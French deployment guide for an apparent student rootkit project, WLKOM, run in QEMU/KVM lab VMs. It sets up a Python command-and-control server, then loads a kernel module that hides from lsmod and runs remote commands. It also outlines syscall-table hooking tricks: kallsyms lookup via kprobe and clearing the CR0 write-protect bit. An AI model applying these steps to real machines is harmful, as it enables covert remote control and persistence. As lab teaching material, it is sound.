---
title: Installation & Déploiement
description: Guide pas à pas pour déployer WLKOM depuis zéro sur un laptop Arch Linux.
---

Tout ce qu'il faut pour reproduire l'environnement WLKOM depuis zéro, sur un laptop Arch Linux.

## Prérequis

- **Arch Linux** — le projet est développé et testé sur les laptops Arch Linux de l'école
- **CPU avec virtualisation matérielle** — Intel VT-x ou AMD-V, activé dans le BIOS

```sh
grep -c vmx /proc/cpuinfo   # Intel (>0 = supporté)
grep -c svm /proc/cpuinfo   # AMD
```

- **Une ISO Arch Linux** — à télécharger sur `archlinux.org/download`
- **~30 Go d'espace disque** — 24 Go pour l'image disque de la VM victime + artefacts de build
- **Python 3.10+** et **pip** — pour le serveur C2

## Installer QEMU/KVM sur l'hôte

```sh
sudo pacman -S qemu-full virt-manager libvirt dnsmasq \
               bridge-utils ebtables iptables-nft
```

Activer les modules noyau KVM :

```sh
sudo modprobe kvm
sudo modprobe kvm_intel   # ou kvm_amd selon le CPU
lsmod | grep kvm          # doit afficher kvm et kvm_intel/kvm_amd
```

Ajouter l'utilisateur au groupe KVM :

```sh
sudo usermod -aG kvm $USER
# se déconnecter et se reconnecter pour que le groupe soit pris en compte
```

:::note[Pourquoi QEMU/KVM et pas VirtualBox ?]
Le sujet l'impose explicitement. KVM exploite la virtualisation matérielle directement via le noyau Linux, offrant des performances quasi-natives. Il fournit aussi `virtfs` (9p sur virtio) utilisé pour le dossier partagé entre l'hôte et la VM victime.
:::

## Choix de la distribution et du noyau

### Pourquoi Arch Linux ?

Arch Linux est une distribution rolling-release. Les paquets `linux` et `linux-headers` sont toujours synchronisés — il n'y a jamais de décalage entre le noyau en cours d'exécution et les headers utilisés pour compiler les modules hors-arbre. C'est critique : tenter de charger un `.ko` compilé contre le mauvais noyau produit immédiatement `insmod: ERROR: could not insert module: Invalid module format`.

### Pourquoi le noyau 6.6 LTS et pas plus récent ?

:::caution[Trois techniques cassent sur les noyaux récents]
**1. `kallsyms_lookup_name()` non exportée (≥ 5.7)**  
Trouver la table des syscalls nécessite de résoudre le symbole noyau `sys_call_table` (non exporté). L'approche standard `kallsyms_lookup_name()` a été retirée des symboles exportés en 5.7. Notre contournement : enregistrer un kprobe sur `kallsyms_lookup_name` elle-même pour récupérer son adresse, puis l'appeler via le pointeur de fonction. Fonctionne sur 6.6 LTS.

**2. Astuce bit WP de CR0 et Intel CET/IBT (≥ 6.3 sur CPUs compatibles)**  
Pour écrire dans la page read-only de la table des syscalls, on efface le bit Write-Protect (WP) dans le registre CR0. Sur les noyaux ≥ 6.3 compilés avec le support Intel CET, appeler `write_cr0()` depuis un module déclenche un fault noyau sur les CPUs avec IBT activé. Le matériel de l'école est antérieur à l'adoption généralisée du CET.

**3. Mode lockdown noyau**  
Linux 5.4 a introduit le Kernel Lockdown LSM. En mode confidentialité, il bloque l'accès à `/proc/kallsyms` et empêche le chargement de modules non signés. Arch Linux ne l'active pas par défaut.

**Verdict :** On cible **Linux 6.6 LTS** (supporté jusqu'en décembre 2026) car c'est le LTS le plus récent sur lequel toutes nos techniques fonctionnent de manière fiable sur le matériel de l'école.
:::

## Configuration de la machine attaquante

Le serveur C2 tourne sur la machine hôte. En réseau user-mode QEMU, l'hôte est toujours accessible depuis les VMs à `10.0.2.2`.

```sh
# Installer Python
sudo pacman -S python python-pip

# Cloner le dépôt
git clone <repo-url>
cd epirootkit

# Installer les dépendances C2
cd attacking_program
pip install -r requirements.txt

# Configurer les identifiants
cp .env.example .env
# Éditer .env : définir SECRET_KEY et ADMIN_PASSWORD

# Démarrer le serveur C2
python app.py   # écoute sur 0.0.0.0:5000
```

Le tableau de bord C2 est accessible sur `http://localhost:5000`.

## Créer la VM victime

![VM QEMU démarrant sur l'ISO Arch Linux](/qemu.png)

```sh
cd virtual-machines/victim

# Créer l'image disque et démarrer sur l'ISO
./create-vm.sh /chemin/vers/archlinux-x86_64.iso
```

Dans l'environnement Arch live, monter le dossier partagé :

```sh
mkdir /mnt/share
mount -t 9p -o trans=virtio epirootkit /mnt/share
```

Lancer l'installation automatisée :

```sh
archinstall \
  --config /mnt/share/user_configuration.json \
  --creds  /mnt/share/user_credentials.json \
  --silent
```

La configuration installe : `linux-headers`, `gcc`, `make`, `openssh`, `vim`, le bootloader GRUB, et configure le montage automatique du dossier partagé.

Après l'installation, redémarrer sur le système installé :

```sh
./start-vm.sh
```

## Post-installation : accès SSH

SSH est redirigé depuis le port **10022** de l'hôte vers la VM :

```sh
ssh root@localhost -p 10022
```

Identifiants par défaut : `root` / `root`

![Terminal SSH connecté à la VM victime](/terminal-ssh.png)

## Compiler le module noyau

Envoyer les sources sur la victime via SSH :

```sh
scp -P 10022 -r rootkit/Makefile rootkit/src root@localhost:/rootkit
```

Sur la machine victime :

```sh
cd /rootkit
make modules        # produit src/wlkom.ko
```

## Charger le rootkit sur la victime

Le paramètre `c2_host` est requis — passer l'IP de l'hôte (toujours `10.0.2.2` en réseau user-mode QEMU) :

```sh
insmod src/wlkom.ko c2_host=10.0.2.2
dmesg | tail        # vérifier les logs noyau
```

Sortie attendue dans `dmesg` :

```
[  0.000] c2: registered uuid=12012406-c73f-4132-bfb6-53797ecb57ca
[  0.001] c2: hiding module from lsmod...
[  0.002] c2: polling /api/12012406-.../action every 5s
```

Une fois chargé, le module est invisible dans `lsmod` et `/proc/modules`.

## Vérifier la connexion

La machine victime doit apparaître dans le tableau de bord C2 dans les 5 secondes :

![Tableau de bord C2 montrant la victime en ligne](/c2-dashboard-online.png)

Tester avec une commande depuis le tableau de bord :

```sh
# Dans le tableau de bord C2 : envoyer l'action "exec:whoami"
# Le résultat apparaît dans le panneau de sortie
```

![Résultat de la commande whoami dans le tableau de bord](/whoami-dashboard.png)
